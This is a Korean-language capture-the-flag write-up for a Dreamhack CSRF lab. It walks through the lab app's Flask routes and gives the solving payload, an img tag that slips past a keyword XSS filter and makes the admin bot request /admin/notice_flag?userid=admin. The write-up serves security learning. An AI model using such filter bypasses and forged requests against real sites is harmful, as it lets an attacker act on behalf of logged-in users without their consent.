# [Dreamhack] csrf-1 풀이

## CSRF란?
로그인한 사용자의 브라우저가 인증 쿠키를 자동으로 전송하는 특성을 악용해, 사용자가 의도하지 않은 요청(비밀번호 변경, 송금, 설정 변경 등)을 서버에 실행시키는 웹 보안 취약점

## CSRF-1

### /
```python
@app.route("/")
def index():
    return render_template("index.html")
```
xss-1, xss-2와 같이 기본 index.html 페이지로 연결

### /vuln
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param
```
param = request.args.get("param","").lower() = 파라메터로 받는 값을 소문자로 저장
xss_filter = ["frame", "script", "on"] = xss filter 규칙 생성 각각 <frame>, <script>, <onerror>와 같은 태그, 이벤트 핸들러 속성을 막기 위함
for ... = 파라메터가 해당 필터에 걸리는 문자가 있을 시 *로 치환함.

### /flag
```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```
기존의 방식과 동일하지만 check_csrf 추가됨

#### check_csrf
```python
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```
입력 받은 파라메터를 피해자(관리자 봇) 브라우저에서 내가 만든 요청이 실행되는 코드

### /memo
```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", None)
    if text:
        memo_text += text
    return render_template("memo.html", memo=memo_text)
```
기존의 memo 라우트와 동일한 구성

### /admin/notice_flag
```python
@app.route("/admin/notice_flag")
def admin_notice_flag():
    global memo_text
    if request.remote_addr != "127.0.0.1":
        return "Access Denied"
    if request.args.get("userid", "") != "admin":
        return "Access Denied 2"
    memo_text += f"[Notice] flag is {FLAG}\n"
    return "Ok"
```
요청한 사용자의 주소가 127.0.0.1 이고, userid가 admin 인지 검사함

## 문제 접근 방법
우선 script와 frane, on 이 필터링 되고 있으니 img 태그를 사용하여 우회한다
### 페이로드
```python
<img src="/admin/notice_flag?userid=admin">
```
img src를 사용하면 일단 서버에 src에 해당하는 주소로 메서드를 GET하기 때문에브라우저는 이 값을 현재 보고 있는 사이트 기준의 상대경로 URL로 해석함.
